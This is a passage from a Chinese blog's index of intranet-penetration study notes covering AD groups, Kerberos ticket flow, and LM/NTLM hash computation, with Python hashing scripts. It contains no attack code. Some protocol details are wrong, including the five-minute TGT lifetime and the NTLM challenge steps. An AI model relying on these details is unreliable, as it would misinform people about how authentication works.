组、通用组。给每一个不同的组分配不同的权限，然后将用户加入特定的组就不用给每个用户分配不同的权限了。\n\n\n\n组类型\n主要作用\n嵌套关系\n\n\n\n本地组\n授予本地域内资源的访问权限\n本地组不能嵌套在其他组中\n\n\n全局组\n实现单域用户访问多域资源\n全局组可以嵌套在其他组中\n\n\n通用组\n实现域森林的跨域访问资源\n通用组成员可以来自域森林中的任何域的用户&#x2F;全局组和其他通用组\n\n\n\n\n知识点：域本地组来自全林，作用于本域；全局组来自本域，作用于全林；通用组来自全林，作用于全林；\nA-G-DL-P策略\nA-G-DL-P策略是指将用户账号添加到全局组中，将全局组添加到与本地组中，然后为域本地组分配资源权限；\n\nA：用户账号（Account）\n\nG：全局组（Global Group）\n\nU：通用组（Univresal Group）\n\nDL：域本地组（Domain Local Group）\n\np：资源权限（permssion）\n\n安装域控时，系统会自动生成一些组，为内置组；内置组定义了一些常用的权限–&gt;Builtin和Users组织单元的组就是内置组；\n\n内置的域本地组在Builtin组织单元中\n\n\n\n\n内置的全局组和通用组在Users组织单元中\n\n\n\n\n\n域本地组\n权限\n\n\n\nadministrators\n管理员组，成员可以不受限制的的存取计算机和域内的资源\n\n\nRemote Desktop Users\n远程登录组，成员具有远程登录权限\n\n\nAccount Operators\n账号操作员组，创建和管理域内用户和组，不能更改administrators和Domain Admins组账户\n\n\nDomain Admins\n域管理员组，成员在所有加入域的服务器&#x2F;域控和AD中均默认拥有完整的管理员权限，用户称为域系统管理员可加入，administrators组不是的\n\n\nDomain Users\n域用户组，默认是内置域的User组\n\n\n","categories":["内网渗透"]},{"title":"内网渗透之kerberos认证（三）","url":"/cl5lak0p80009gpsb78gq0nd5/","content":"\n在工作组中常见的就是点对点的认证，基于NTLM认证协议，而在域中，则依赖kerberos认证协议。kerberos是一种计算机网络认证协议，为域中网络通信的两端提供身份验证服务，类似于第三方的信托机构。\n\n\n\n\n参考：https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/\nhttps://ssooking.github.io/2019/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos/\n\n类比kerberos认证\n这里类比一个场景来理解kerberos认证。假设有一家高级餐厅，这里转为高级官员用餐的地方，在这里用餐只能用凭借会员证、用餐券才能入住就餐。有一个VIP用户想去就餐，那么他肯定要经过以下流程：\n\n用户到服务中心提供自己的姓名、身份证、手机号等信息请求服务中心颁发会员证\n\n服务中心将用户提供的信息拿到数据库中进行核实是否存在这么一个VIP用户，存在则颁发会员证。\n\n用户凭借会员证再到服务中心请求兑换用餐券，根据会员证上的等级和个人信誉信息，拿到了一张指定房间的用餐券。\n\n用户拿着用餐券到指定房间用餐，若去其他房间则无法用餐。\n\nkerberos认证的机制与其相似，可以看出这里最重要的就是会员证和用餐券。先拿到会员证，再凭借会员证去拿用餐券，服务中心则是KDC，这里两次验证则类比分别对比我们KDC中的AS和TGS，而指定的房间则类似于我们所请求的服务，会员证则类比于TGT，用餐券则类比于Ticket。\n协议中的角色\nKDC（Key Distribution Center）：密钥分发中心，包含AS和TGS两部分。AS可以生成TGT，客户端将TGT传输到TGS，TGS生成Ticket返回给客户端，客户端带着Ticket请求服务器。\n\nAS    （Authentication Service）：KDC中专门用来认证客户端身份的的身份认证服务服务器，客户端请求后鉴别成功后生成TGT。\n\nTGS   （Ticket Grant Service）：票据分发服务，\n\nTGT    （Ticket Granting Ticket）：票据授予凭证\n\nTicket ：票据，请求服务器的凭证。\nKerberos认证\n这里分为三步走，\n请求AS获得TGT\n由于客户端是第一次访问KDC，KDC也无法确定客户端的身份是否为伪造的，因此第一次访问就是确认客户端的身份，我们发送的则是明文，请求响应如下。\n\n\n\n客户端以明文的方式发送请求，其中请求包含用户名、IP、时间戳等信息。\nAS服务器收到请求数据后，将用户名拿到数据库进行查询，这里的数据库不再是Windows系统中常见的sam，而是域控制器（DC）上的NTDS.dit，KDC一般都部署在域控制器上面。此时只判断用户是否存在，有以下两种情况。\n如果用户名不存在，认证服务结束。\n如果用户名存在，那么AS服务器则会生成相应的数据返回给客户端。\n\n\n返回的数据当中包含两部分：TGT（票据授权票据）、Session Key（会话密钥）。\nTGT中包含域控制器中的存储客户端的用户名、IP、时间戳、访问的TGS服务器名称、TGT的有效时间（这里只有五分钟的实效），还有访问TGS的Session Key，我理解为登陆的Cookie吧，这些都是经过TGS加密的，加密密钥在本地获取，没有网络传输，因此不存在劫持破解的风险，这里的密钥是域krbtgt账户的Hash，只存在于域控制器上，因此客户端无法破解。\nSession key是KDC生成的一串随机字符串，然后再使用客户端的的NTLM Hash加密该Session Key和客户端的用户、IP、请求时间戳、请求的TGS服务器后的得到第二部分加密内容。\n\n\n密钥均未在网络中传输，因此不会被劫持，是比较安全的。客户端只有输入正确当前请求用户的Hash才可以解密第二部分的数据得到访问TGS的Session Key，因此第一次通信结束。请求TGS获得Ticket\n\n\n客户端接收到AS服务器响应的内容后，因为我们不知道krbtgt账户的Hash，因此只能解密第二部分的对响应。利用本地用户的Hash对第二部分响应进行解密，得到Session key、请求时间戳和请求的TGS服务器等信息。判断请求时间戳于当前时间戳差值大于5分钟则认为该请求无效或AS服务器被伪造，否则便向TGS服务器发送请求，请求响应如下。\n\n\n将AS响应的数据解密，发送以下请求。\n以明文的形式发送想要访问的服务到TGS服务器。\n将请求AS得到的TGT直接发送给TGS服务器。\n将解密得到Session Key当作密钥加密客户端用户名、IP、时间戳、进行加密发送到TGS服务器。\n\n\nTGS服务器接收到请求后，判断请求到服务是否存在，有以下两种情况。\n服务不存在，认证服务结束。\n服务存在，继续进行验证。\n\n\nTGS用krbtgt用户的Hash对TGT进行解密，得到AS认证时记录的客户端信息、时间戳、请求IP信息、Session Key。在用Session Key对第二次请求对数据进行解密，对比两次数据的请求是否一致，是否发生篡改，如果可以解密，数据一致则认为认证成功。然后返回响应数据，响应数据包含两部分，如下：\nTGS生成一个Service Session Key用于客户端访问服务器的Session，并用之前的Session Key对其进行加密处理。\nTGS生成Server Ticket，包含Service Session Key和客户端的一些信息，并用服务器密码的Hash对其进行加密。\n\n\n\n\n目前我们这里只能对第一部分进行解密，因为我们有向AS服务器发送请求对Session Key。\n携带Ticket请求服务器\n客户端收到TGS的响应，这里会发送两部分数据，请求和响应结果如下：\n\n\n\n客户端发送的请求如下：\n收到响应因为无法解密Server Ticket票据，因此直接发送即可。\n然后再用收到Service Session Key加密我们客户端的用户名、IP、请求时间戳等信息。\n\n\n服务端收到消息之后用服务器密码Hash对Server Ticket进行解密得到Service Session Key，再对第二部分请求进行解密得到客户端的信息，因此则认证成功。服务器响应的数据如下：\n将解密后的客户端信息用Service Session Key重新加密发送给客户端。\n将加密后的Server Ticket缓存在自己的内存中\n\n\n客户端收到消息后用本地缓存的Service Session Key对响应数据进行解密，如果数据和请求数据一样，那么则认证服务器的身份没有被篡改或劫持。\n至此kerberos认证结束，后面访问只需携带Ticket即可，则无需再次认证。总结\n\n\n这里的有三次通信，第一次学习需要慢慢梳理，每次的请求都是随机生成的Session Key，且有时长限制，因此不用担心被破解，并且用户密钥都是在本地，并没有在网络中传播。但是这里认证过程中的Server Ticket仍可能被伪造，就是后面所要提到的PTT（Pass The Ticket）票据传递攻击。\n这里借用seevae师傅的一张图。\n\n\n","categories":["内网渗透"]},{"title":"内网渗透之Windows认证（二）","url":"/6/","content":"\n为什么有这篇文章呢，因为我们知道平常的Web系统有注册、登录是依赖数据库和后端的加密解密算法。那么Windows系统登录的时候是如何进行身份验证的呢，是否也有一个类似数据库的东西，或者就是一个单纯的文本呢？\n\n\n\n\n参考–Windows内网协议学习NTLM篇之NTLM基础介绍\nWindows也有一个类似于数据的东西，存放在%SystemRoot%\\system32\\config\\sam，里面存放着用户的凭证信息，当然这肯定不是明文，不然Windows这么写也太不安全了。这里的加密算法不同于常见的MD5，加密后的数据有两种分别为LM Hash和NTLM Hash。\n\nLM Hash\nLM Hash全称LAN Manager Hash，由IBM设计一般用于Windows XP、Windows 2000、Windows 2003 这一类系统中。加密算法如下。\n\n密码长度不能超过14个字符。\n\n密码转换为大写，再转换成16进制的字符串，没有28位长度的，在右边加0。\n\n再将十六进制的字符串分为两组14位的字符串。\n\n再将这两组14位的字符串进行十六进制转二进制，转换完成后不满足56位的在左边加0。\n\n两部分分别划分为每组七位，在其末尾加0，再分别转换为十六进制。\n\n最后将这两组数据作为DES加密所需的Key，KGS!@#$%作为需加密的字符，将DES加密后的数据依次拼接。\n\n这里借用zjun的脚本。\nimport binasciiimport codecsfrom pyDes import *def DesEncrypt(str, Key):    k = des(Key, ECB, pad=None)    EncryptStr = k.encrypt(str)    return binascii.b2a_hex(EncryptStr)def ZeroPadding(str):    b = []    l = len(str)    num = 0    for n in range(l):        if (num &lt; 8) and n % 7 == 0:            b.append(str[n:n + 7] + &#x27;0&#x27;)            num = num + 1    return &#x27;&#x27;.join(b)if __name__ == &quot;__main__&quot;:    passwd = sys.argv[1]    print(&#x27;你的输入是:&#x27;, passwd)    print(&#x27;转化为大写:&#x27;, passwd.upper())    # 用户的密码转换为大写，并转换为 16 进制字符串    passwd = codecs.encode(passwd.upper().encode(), &#x27;hex_codec&#x27;)    print(&#x27;转为 hex:&#x27;, passwd.decode())    # 密码不足 28 位，用 0 在右边补全    passwd_len = len(passwd)    if passwd_len &lt; 28:        passwd = passwd.decode().ljust(28, &#x27;0&#x27;)    print(&#x27;补齐 28 位:&#x27;, passwd)    # 28 位的密码被分成两个 14 位部分    PartOne = passwd[0:14]    PartTwo = passwd[14:]    print(&#x27;两组 14 位的部分:&#x27;, PartOne, PartTwo)    # 每部分分别转换成比特流，并且长度为 56 位，长度不足用 0 在左边补齐长度    PartOne = bin(int(PartOne, 16)).lstrip(&#x27;0b&#x27;).rjust(56, &#x27;0&#x27;)    PartTwo = bin(int(PartTwo, 16)).lstrip(&#x27;0b&#x27;).rjust(56, &#x27;0&#x27;)    print(&#x27;两组 56 位比特流:&#x27;, PartOne, PartTwo)    # 两组分别再分为 7 位一组末尾加 0，再分别组合成新的字符    PartOne = ZeroPadding(PartOne)    PartTwo = ZeroPadding(PartTwo)    print(&#x27;两组再 7 位一组末尾加 0:&#x27;, PartOne, PartTwo)    # 两组数据转 hex    PartOne = hex(int(PartOne, 2))[2:]    PartTwo = hex(int(PartTwo, 2))[2:]    if &#x27;0&#x27; == PartTwo:        PartTwo = &quot;0000000000000000&quot;    print(&#x27;两组转为 hex:&#x27;, PartOne, PartTwo)    # 16 位的二组数据，分别作为 DES key 为&quot;KGS!@#$%&quot;进行加密。    LMOne = DesEncrypt(&quot;KGS!@#$%&quot;, binascii.a2b_hex(PartOne)).decode()    LMTwo = DesEncrypt(&quot;KGS!@#$%&quot;, binascii.a2b_hex(PartTwo)).decode()    print(&#x27;两组 DES 加密结果:&#x27;, LMOne, LMTwo)    # 将二组 DES 加密后的编码拼接，得到 LM HASH 值。    LM = LMOne + LMTwo    print(&#x27;LM hash:&#x27;, LM)\n\n\n可以看出密码长度小于7时，后面加密的数据是固定的，均为aad3b435b51404ee，因此其加密是不安全的。\nNTML Hash\nNTML Hash全称NT LAN Manager ， 目前 Windows 基本都使用 NTLM hash ，一个32位长度的字符串。支持Net NTLM认证协议及本地认证过程中的关键凭据。加密算法如下：\n\n密码转换为十六进制\n\nUnicode编码\n\nMD4加密\n\nPython脚本如下：\nimport hashlibimport binasciiimport sysprint(binascii.hexlify(hashlib.new(&quot;md4&quot;, sys.argv[1].encode(&quot;utf-16le&quot;)).digest()).decode())\n\n\n123456经过加密后则为32ed87bdb5fdc5e9cba88547376818d4。\nWindows本地认证\nwinlogon.exe -&gt; 接收用户密码 -&gt; lsass.exe -&gt; 比对sam表。\n\nwinlogon就是登陆界面，接受用户密码之后会发送明文到lsass.exe，lsass.exe会存储一份明文，然后加密明文和sam表的hash做比对，判断是否可以登陆。\n\nWindows Logon Process(即 winlogon.exe)，是Windows NT 用户登陆程序，用于管理用户登录和退出。LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。\n\n这里注意如果打了补丁KB2871997，或者机器是win2012之后，则不会保存明文密码了。\nNTLM认证协议\n什么是NTLM认证协议呢？和NTLM Hash又有什么区别呢？NTLM是一种网络认证协议，它是基于挑战（Chalenge）&#x2F;响应（Response）认证机制的一种认证模式。NTLM 网络认证协议是以 NTLM Hash 作为根本凭证进行认证的协议。\n\n在内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑上的网络环境(工作区)，隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是比较落后的认证方式， 没有信托机构。\n\n假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。\n\n早期SMB协议在网络上传输明文口令。后来出现LAN Manager Challenge&#x2F;Response验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了NTLM以及Kerberos。\n\n认证流程分为三部分，分别是：协商、质询、身份验证。\n\n\n\n协商\n客户端向服务器发送协商请求，包含用户名、密码、认证协议版本等信息。\n质询\n服务器接收到客户端发送到协商信息，这时服务器会生成一个随机数，叫做challenge，这里的不同的协议随机数长度不同，NTLM V1是8位，NTLM V2是16位。\n\n服务器将登陆的用户对应的NTLM Hash加密challenge，得到Net NTLM Hash，和生成的challenge一起发送给客户端。\n验证\n客户端收到challenge后，将用户的hash与challenge进行加密运算得到resposne，将username、response、challenge发送给服务器，最后服务器进行校验返回认证结果。\nWireShark\n知道了基本原理自己实战试试\n\n\n","categories":["内网渗透"]}]